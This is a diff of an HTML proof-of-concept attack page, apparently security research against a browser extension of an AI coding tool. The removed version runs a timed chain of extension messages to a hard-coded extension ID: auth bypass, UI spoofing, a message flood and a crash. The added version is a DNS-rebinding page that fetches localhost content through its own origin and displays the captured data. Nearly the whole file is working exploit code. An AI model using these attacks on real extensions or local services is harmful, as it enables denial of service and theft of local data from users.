@@ -1,110 +1,88 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Antigravity Automated Attack (Delayed)</title>
+    <title>DNS Rebinding: Phase 1 (Data Theft)</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a0a;
+            color: #00ff41;
+            padding: 20px;
+        }
+        .console {
+            background: #000;
+            border: 1px solid #00ff41;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
+        }
+        h1 {
+            color: #fff;
+            border-bottom: 2px solid #00ff41;
+            padding-bottom: 10px;
+        }
+        .data-box {
+            background: #111;
+            border: 1px dashed #555;
+            padding: 10px;
+            margin-top: 20px;
+            color: #ccc;
+            white-space: pre-wrap;
+            height: 300px;
+            overflow-y: auto;
+        }
+        button {
+            background: #00ff41;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        button:hover {
+            background: #00cc33;
+        }
+        .status {
+            margin-bottom: 15px;
+            font-style: italic;
+        }
+    </style>
 </head>
-
 <body>
-
-<input type="hidden" id="extId" value="eeijfnjmjelapkebgockoeaadonbchdd">
-
-<h2>Attack will start in <span id="countdown">10</span> seconds</h2>
-
-<hr>
-
-<div id="attackLog">
-    Waiting for timer...
-</div>
-
-<script>
-/* ---------------- TIMER ---------------- */
-let remaining = 10;
-const countdownEl = document.getElementById("countdown");
-
-const countdownTimer = setInterval(() => {
-    remaining--;
-    countdownEl.innerText = remaining;
-
-    if (remaining === 0) {
-        clearInterval(countdownTimer);
-        countdownEl.innerText = "0";
-        startAttack();
-    }
-}, 1000);
-
-/* ---------------- CORE LOGIC ---------------- */
-const getExtId = () => document.getElementById("extId").value;
-
-const attackLog = (msg) => {
-    const el = document.getElementById("attackLog");
-    el.innerHTML += `[Log] ${msg}<br>`;
-};
-
-const sleep = ms => new Promise(r => setTimeout(r, ms));
-
-async function startAttack() {
-    const extId = getExtId();
-    attackLog("Timer expired");
-
-    // STEP 1: AUTH BYPASS
-    attackLog("Step 1: Testing Auth Bypass...");
-    try {
-        chrome.runtime.sendMessage(extId, {
-            action: "rpcCall",
-            method: "smartFocusConversation",
-            params: { L: "PING" }
-        }, r => {
-            attackLog("Reply: " + (r ? JSON.stringify(r) : "No reply"));
-        });
-    } catch (e) {
-        attackLog("Error during Step 1");
-    }
-    await sleep(2000);
-
-    // STEP 2: UI SPOOF
-    attackLog("Step 2: Triggering UI manipulation...");
-    try {
-        chrome.runtime.sendMessage(extId, {
-            action: "rpcCall",
-            method: "validateCascadeOrCancelOverlay",
-            params: { L: "ATTACK" }
-        });
-    } catch (e) {
-        attackLog("Error during Step 2");
-    }
-    await sleep(2000);
-
-    // STEP 3: FOCUS FLOOD
-    attackLog("Step 3: Focus flood (5s)...");
-    let flood = setInterval(() => {
-        chrome.runtime.sendMessage(extId, {
-            action: "rpcCall",
-            method: "smartFocusConversation",
-            params: { L: "FLOOD" }
-        });
-    }, 50);
-
-    await sleep(5000);
-    clearInterval(flood);
-    attackLog("Flood stopped.");
-
-    // STEP 4: DoS / CRASH
-    attackLog("Step 4: Executing DoS crash...");
-    try {
-        chrome.runtime.sendMessage(extId, {
-            action: "rpcCall",
-            method: "smartFocusConversation"
-            // missing params → crash path
-        });
-    } catch (e) {
-        attackLog("Error during Step 4");
-    }
-
-    attackLog("Attack chain completed.");
-}
-</script>
-
+    <div class="console">
+        <h1>Satellite Pivot: DNS Rebinding</h1>
+        <div id="status" class="status">Waiting for user interaction...</div>
+        <button onclick="startExfiltration()">Simulate Login (Start Attack)</button>
+        <div id="output-label" style="margin-top:20px; font-weight:bold;">Localhost Data (Exfiltrated):</div>
+        <div id="data-display" class="data-box">No data captured yet.</div>
+    </div>
+    <script>
+        const statusEl = document.getElementById('status');
+        const dataEl = document.getElementById('data-display');
+        async function startExfiltration() {
+            statusEl.innerText = "Attempting to bypass SOP/PNA protections...";
+            // This URL points to 'the same origin' (rbndr.us) but physically hits 127.0.0.1
+            const targetUrl = window.location.origin + "/";
+            try {
+                // We perform a credentialed fetch to the root of the server
+                const response = await fetch(targetUrl);
+                if (response.ok) {
+                    const text = await response.text();
+                    statusEl.innerText = "🔥 SUCCESS: SOP Bypassed. Localhost data recovered!";
+                    statusEl.style.color = "#00ff41";
+                    // Display the 'stolen' local directory listing/content
+                    dataEl.innerText = text;
+                } else {
+                    statusEl.innerText = `Connected, but server returned error ${response.status}`;
+                }
+            } catch (err) {
+                statusEl.innerText = "Error: " + err.message + " (PNA block or DNS not flipped yet)";
+                statusEl.style.color = "#ff4100";
+                console.error(err);
+            }
+        }
+    </script>
 </body>
 </html>
